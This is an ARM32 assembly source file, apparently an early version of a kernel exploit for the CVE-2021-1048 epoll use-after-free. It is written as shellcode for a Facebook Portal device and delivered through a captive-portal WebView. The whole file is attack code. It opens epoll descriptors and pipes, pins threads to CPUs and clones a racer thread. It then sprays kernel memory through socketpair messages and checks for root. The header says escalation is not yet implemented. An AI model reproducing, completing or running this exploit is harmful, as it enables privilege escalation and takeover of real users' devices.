/*
 * epoll_uaf.s — CVE-2021-1048 epoll UAF kernel exploit (v1.1: race test)
 * ARM32 EABI shellcode for Facebook Portal captive portal WebView
 *
 * Target: Portal 10" Gen 1 (aloha), APQ8098/SD835
 *         Kernel 4.4.153, Android 9, security patch 2019-08-01
 *
 * This v1 tests the race condition and spray mechanism.
 * It does NOT yet implement kernel escalation (addr_limit clobber).
 * Returns diagnostic data about the race (iteration count, spray status).
 *
 * Entry: R4 = wasm_mem (loaded by mprotect_jump stager)
 *
 * Memory layout (offsets from wasm_mem):
 *   +0x0000..0x07FF: shellcode
 *   +0x0800..0x0FFF: child stack (2KB, top at +0x0FF0)
 *   +0x1000..0x107F: spray control data (128 bytes)
 *   +0x1080..0x10FF: recv control buffer (128 bytes)
 *   +0x1100..0x117F: scratch (iovec, dummy byte, etc.)
 *   +0x1200..0x12FF: pipe R/W buffer
 *   +0x1400..0x14FF: results (read by JS decoder)
 *   +0x1500..0x15FF: shared state (epfd_inner, flags, pipe fds)
 *
 * Shared state layout (wasm_mem + 0x1500, = R11 + 0x100):
 *   +0x00: epfd_inner  (+0x04: epfd_outer  +0x08: stop_flag  +0x0C: trig_pipe0)
 *   +0x10: pipe fds array start (8 pipes * 8 bytes = 64 bytes)
 *
 * Results (wasm_mem + 0x1400, = R11):
 *   [+0x00] phase        [+0x04] epfd_outer    [+0x08] epfd_inner
 *   [+0x0C] iterations   [+0x10] spray_sent    [+0x14] spray_recv
 *   [+0x18] child_pid    [+0x1C] uid_after     [+0x20] final_status
 *
 * Return: 0xCCxx (xx = status byte)
 */

    .syntax unified
    .arch armv7-a
    .text
    .align 2
    .globl _start
    .type _start, %function

/* Syscall numbers (ARM32 EABI) */
.equ NR_exit,              1
.equ NR_read,              3
.equ NR_write,             4
.equ NR_close,             6
.equ NR_getuid32,          199
.equ NR_clone,             120
.equ NR_wait4,             114
.equ NR_pipe2,             359
.equ NR_nanosleep,         162
.equ NR_sched_setaffinity, 241
.equ NR_sched_yield,       158
.equ NR_epoll_create1,     357
.equ NR_epoll_ctl,         251
.equ NR_socketpair,        288
.equ NR_sendmsg,           296
.equ NR_recvmsg,           297

.equ EPOLL_CTL_ADD, 1
.equ EPOLL_CTL_DEL, 2
.equ EPOLLIN,       1

.equ SIGCHLD,       17
.equ CLONE_VM,      0x100
.equ CLONE_FILES,   0x400

.equ FRAME, 96

/* Stack frame offsets */
.equ S_SV,     0       /* socketpair fds (8B) */
.equ S_PIPE,   8       /* rw pipe fds (8B) */
.equ S_EPE,    16      /* epoll_event (12B) */
.equ S_IOV,    28      /* iovec (8B) */
.equ S_MSG,    36      /* msghdr (28B) */
.equ S_TS,     64      /* timespec (8B) */
.equ S_WSTAT,  72      /* wait4 status (4B) */
.equ S_CPUM,   76      /* cpu_mask (8B) */
.equ S_TPIPE,  84      /* trigger pipe fds (8B) */

/*
 * Register plan:
 *   R10 = wasm_mem base (permanent)
 *   R11 = results base = wasm_mem + 0x1400 (permanent)
 *         shared state at R11 + 0x100 = wasm_mem + 0x1500
 *   R8  = epfd_outer (permanent after phase 1)
 *   R6  = sv[0] spray send socket (permanent after phase 1)
 *   R5  = sv[1] spray recv socket (permanent after phase 1)
 *   R9  = iteration counter (phase 2)
 *   R4  = child PID (phase 2) / scratch
 *   R7  = syscall number (per-call)
 */

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #FRAME
    mov     r10, r4             /* R10 = wasm_mem */
    add     r11, r10, #0x1400   /* R11 = results */
    mov     r0, #1
    str     r0, [r11]           /* phase = 1 */

/* ═══ PHASE 1: SETUP ═══ */

    /* 1a. epfd_outer = epoll_create1(0) */
    mov     r0, #0
    movw    r7, #NR_epoll_create1
    svc     #0
    cmp     r0, #0
    blt     fail_setup
    mov     r8, r0
    str     r0, [r11, #0x04]   /* results.epfd_outer */

    /* 1b. epfd_inner = epoll_create1(0) */
    mov     r0, #0
    movw    r7, #NR_epoll_create1
    svc     #0
    cmp     r0, #0
    blt     fail_setup
    str     r0, [r11, #0x100]  /* shared.epfd_inner (R11+0x100) */
    str     r0, [r11, #0x08]   /* results.epfd_inner */

    /* 1c. epoll_ctl(outer, ADD, inner, &event) */
    /* Build epoll_event on stack */
    mov     r1, #EPOLLIN
    str     r1, [sp, #S_EPE]       /* events */
    mov     r1, #0
    str     r1, [sp, #S_EPE + 4]   /* data lo */
    str     r1, [sp, #S_EPE + 8]   /* data hi */
    /* syscall */
    mov     r0, r8                  /* epfd_outer */
    mov     r1, #EPOLL_CTL_ADD
    ldr     r2, [r11, #0x100]      /* epfd_inner */
    add     r3, sp, #S_EPE
    movw    r7, #NR_epoll_ctl
    svc     #0

    /* 1d. Create 8 pipes, add read-ends to epfd_inner */
    mov     r9, #0
pipe_loop:
    cmp     r9, #8
    bge     pipe_done
    /* Pipe fds at R11+0x110 + i*8 (shared.pipes) */
    add     r0, r11, #0x110
    add     r0, r0, r9, lsl #3
    mov     r1, #0
    movw    r7, #NR_pipe2
    svc     #0
    cmp     r0, #0
    blt     pipe_done

    /* epoll_ctl(inner, ADD, pipe[i][0], &event) */
    ldr     r0, [r11, #0x100]      /* epfd_inner */
    mov     r1, #EPOLL_CTL_ADD
    add     r3, r11, #0x110
    ldr     r2, [r3, r9, lsl #3]   /* pipe[i][0] = read end */
    add     r3, sp, #S_EPE
    movw    r7, #NR_epoll_ctl
    svc     #0
    add     r9, r9, #1
    b       pipe_loop
pipe_done:

    /* 1e. Spray socketpair */
    mov     r0, #1              /* AF_UNIX */
    mov     r1, #1              /* SOCK_STREAM */
    mov     r2, #0
    add     r3, sp, #S_SV
    movw    r7, #NR_socketpair
    svc     #0
    cmp     r0, #0
    blt     fail_setup
    ldr     r6, [sp, #S_SV]        /* R6 = sv[0] */
    ldr     r5, [sp, #S_SV + 4]    /* R5 = sv[1] */

    /* 1f. Kernel R/W pipe */
    add     r0, sp, #S_PIPE
    mov     r1, #0
    movw    r7, #NR_pipe2
    svc     #0

    /* 1g. Trigger pipe (for child to add/remove from epfd_outer) */
    add     r0, sp, #S_TPIPE
    mov     r1, #0
    movw    r7, #NR_pipe2
    svc     #0
    cmp     r0, #0
    blt     fail_setup

    /* 1h. Pin parent to CPU 0 */
    mov     r0, #1
    str     r0, [sp, #S_CPUM]
    mov     r0, #0
    str     r0, [sp, #S_CPUM + 4]
    mov     r0, #0
    mov     r1, #8
    add     r2, sp, #S_CPUM
    movw    r7, #NR_sched_setaffinity
    svc     #0

    /* Store shared state for child thread */
    str     r8, [r11, #0x104]       /* shared.epfd_outer */
    mov     r0, #0
    str     r0, [r11, #0x108]       /* shared.stop_flag = 0 */
    ldr     r0, [sp, #S_TPIPE]
    str     r0, [r11, #0x10C]       /* shared.trig_pipe0 (read end) */

    /* Phase 1 complete */
    mov     r0, #2
    str     r0, [r11]              /* phase = 2 */

/* ═══ PHASE 2: RACE ═══ */

    /* Clone child: CLONE_VM | CLONE_FILES | SIGCHLD = 0x511 */
    movw    r0, #0x511             /* CLONE_VM|CLONE_FILES|SIGCHLD */
    /* Child stack: wasm_mem+0x0FF0 (stack grows down, 2KB region) */
    sub     r1, r11, #0x410        /* R11-0x410 = wasm+0x1400-0x410 = wasm+0x0FF0 */
    mov     r2, #0
    mov     r3, #0
    mov     r4, #0
    mov     r7, #NR_clone
    svc     #0
    cmp     r0, #0
    beq     child_racer
    cmp     r0, #0
    ble     fail_clone
    mov     r4, r0                  /* R4 = child PID */
    str     r0, [r11, #0x18]       /* results.child_pid */

/* ─── Parent: race loop ─── */
    mov     r9, #0                  /* iteration counter */

race_loop:
    cmp     r9, #200               /* max race attempts */
    bge     race_done

    /* === Close epfd_inner === */
    ldr     r0, [r11, #0x100]      /* epfd_inner */
    mov     r7, #NR_close
    svc     #0

    /* === Spray: sendmsg with 128-byte iov data === */
    /* v1.0 used msg_control but compat cmsghdr validation rejected 0x41414141.
     * v1.1: send 128B as regular iov data. Kernel allocates sk_buff in recv queue.
     * For v2: will use valid SCM_RIGHTS cmsghdr for precise kmalloc-128 targeting. */

    /* Fill spray buffer (wasm_mem+0x1000) with marker 0x41414141 */
    sub     r0, r11, #0x400        /* wasm_mem+0x1000 */
    movw    r1, #0x4141
    movt    r1, #0x4141
    mov     r2, #0
spray_fill:
    str     r1, [r0, r2]
    add     r2, r2, #4
    cmp     r2, #128
    blt     spray_fill

    /* iovec: 128 bytes of spray data */
    sub     r0, r11, #0x400        /* iov_base = spray buf (wasm+0x1000) */
    str     r0, [sp, #S_IOV]       /* iov_base */
    mov     r0, #128
    str     r0, [sp, #S_IOV + 4]   /* iov_len = 128 */

    /* msghdr — NO msg_control (avoids compat cmsghdr validation) */
    mov     r0, #0
    str     r0, [sp, #S_MSG]       /* msg_name = NULL */
    str     r0, [sp, #S_MSG + 4]   /* msg_namelen */
    add     r1, sp, #S_IOV
    str     r1, [sp, #S_MSG + 8]   /* msg_iov */
    mov     r1, #1
    str     r1, [sp, #S_MSG + 12]  /* msg_iovlen */
    mov     r1, #0
    str     r1, [sp, #S_MSG + 16]  /* msg_control = NULL */
    str     r1, [sp, #S_MSG + 20]  /* msg_controllen = 0 */
    str     r1, [sp, #S_MSG + 24]  /* msg_flags = 0 */

    /* sendmsg(sv[0], &msghdr, 0) */
    mov     r0, r6
    add     r1, sp, #S_MSG
    mov     r2, #0
    movw    r7, #NR_sendmsg
    svc     #0
    cmp     r0, #0
    bgt     spray_sent_ok
    b       spray_skip
spray_sent_ok:
    ldr     r1, [r11, #0x10]
    add     r1, r1, #1
    str     r1, [r11, #0x10]       /* results.spray_sent++ */
spray_skip:

    /* === Recreate epfd_inner === */
    mov     r0, #0
    movw    r7, #NR_epoll_create1
    svc     #0
    cmp     r0, #0
    blt     race_done
    str     r0, [r11, #0x100]      /* shared.epfd_inner = new fd */
    str     r0, [r11, #0x08]       /* results.epfd_inner */

    /* Re-add inner to outer */
    mov     r0, r8
    mov     r1, #EPOLL_CTL_ADD
    ldr     r2, [r11, #0x100]
    add     r3, sp, #S_EPE
    movw    r7, #NR_epoll_ctl
    svc     #0

    /* Drain spray socket: recvmsg(sv[1], ..., MSG_DONTWAIT) */
    sub     r0, r11, #0x380        /* recv buf at wasm+0x1080 */
    str     r0, [sp, #S_IOV]
    mov     r0, #128
    str     r0, [sp, #S_IOV + 4]   /* iov_len = 128 */

    mov     r0, #0
    str     r0, [sp, #S_MSG]
    str     r0, [sp, #S_MSG + 4]
    add     r1, sp, #S_IOV
    str     r1, [sp, #S_MSG + 8]
    mov     r1, #1
    str     r1, [sp, #S_MSG + 12]
    mov     r1, #0
    str     r1, [sp, #S_MSG + 16]  /* msg_control = NULL */
    str     r1, [sp, #S_MSG + 20]  /* msg_controllen = 0 */
    str     r1, [sp, #S_MSG + 24]

    mov     r0, r5                  /* sv[1] */
    add     r1, sp, #S_MSG
    mov     r2, #0x40               /* MSG_DONTWAIT */
    movw    r7, #NR_recvmsg
    svc     #0
    cmp     r0, #0
    ble     recv_skip
    ldr     r1, [r11, #0x14]
    add     r1, r1, #1
    str     r1, [r11, #0x14]       /* results.spray_recv++ */
recv_skip:

    /* yield to child */
    mov     r7, #NR_sched_yield
    svc     #0

    add     r9, r9, #1
    str     r9, [r11, #0x0C]       /* results.iterations */
    b       race_loop

race_done:
    /* Signal child to stop */
    mov     r0, #1
    str     r0, [r11, #0x108]      /* shared.stop_flag = 1 */

    /* Brief sleep to let child notice */
    mov     r0, #0
    str     r0, [sp, #S_TS]
    ldr     r0, lit_10ms
    str     r0, [sp, #S_TS + 4]
    add     r0, sp, #S_TS
    mov     r1, #0
    movw    r7, #NR_nanosleep
    svc     #0

    /* wait4(child, &wstatus, WNOHANG, NULL) */
    mov     r0, r4
    add     r1, sp, #S_WSTAT
    mov     r2, #1                  /* WNOHANG */
    mov     r3, #0
    mov     r7, #NR_wait4
    svc     #0

    /* Check uid */
    mov     r7, #NR_getuid32
    svc     #0
    str     r0, [r11, #0x1C]       /* results.uid_after */

    /* Store final status */
    cmp     r0, #0
    beq     got_root
    movw    r0, #0xCC01             /* race done, no root (expected for v1) */
    str     r0, [r11, #0x20]
    b       done

got_root:
    movw    r0, #0xCC00             /* root achieved! */
    str     r0, [r11, #0x20]
    b       done

/* ─── Child racer thread ─── */
child_racer:
    /* Pin to CPU 1 */
    mov     r0, #2                  /* CPU 1 bit */
    str     r0, [sp, #S_CPUM]
    mov     r0, #0
    str     r0, [sp, #S_CPUM + 4]
    mov     r0, #0
    mov     r1, #8
    add     r2, sp, #S_CPUM
    movw    r7, #NR_sched_setaffinity
    svc     #0

child_loop:
    /* Check stop flag */
    ldr     r0, [r11, #0x108]
    cmp     r0, #0
    bne     child_exit

    /* epoll_ctl(outer, ADD, trig_pipe0, &event) */
    /* Set up event at wasm_mem+0x1160 (via R11+0x160...) */
    /* Actually, use R11-0x2A0 = wasm+0x1160... that's tricky.
     * Just use the stack-based event from parent — CLONE_VM shares memory.
     * But the stack is different. Use wasm_mem scratch instead. */
    /* Write event at R11-0x200 = wasm+0x1200 */
    mov     r0, #EPOLLIN
    str     r0, [r11, #-0x200]     /* wasm+0x1200: events */
    mov     r0, #0
    str     r0, [r11, #-0x1FC]     /* wasm+0x1204: data lo */
    str     r0, [r11, #-0x1F8]     /* wasm+0x1208: data hi */

    ldr     r0, [r11, #0x104]      /* shared.epfd_outer */
    mov     r1, #EPOLL_CTL_ADD
    ldr     r2, [r11, #0x10C]      /* shared.trig_pipe0 */
    sub     r3, r11, #0x200        /* &event at wasm+0x1200 */
    movw    r7, #NR_epoll_ctl
    svc     #0

    /* yield */
    mov     r7, #NR_sched_yield
    svc     #0

    /* epoll_ctl(outer, DEL, trig_pipe0, NULL) */
    ldr     r0, [r11, #0x104]
    mov     r1, #EPOLL_CTL_DEL
    ldr     r2, [r11, #0x10C]
    mov     r3, #0
    movw    r7, #NR_epoll_ctl
    svc     #0

    b       child_loop

child_exit:
    mov     r0, #0
    mov     r7, #NR_exit
    svc     #0

/* ═══ Error paths ═══ */
fail_setup:
    movw    r0, #0xCC10
    str     r0, [r11, #0x20]
    b       done
fail_clone:
    movw    r0, #0xCC20
    str     r0, [r11, #0x20]
    b       done

done:
    ldr     r0, [r11, #0x20]       /* return status */
    add     sp, sp, #FRAME
    pop     {r4-r11, pc}

    .align 2
lit_10ms:
    .word   10000000
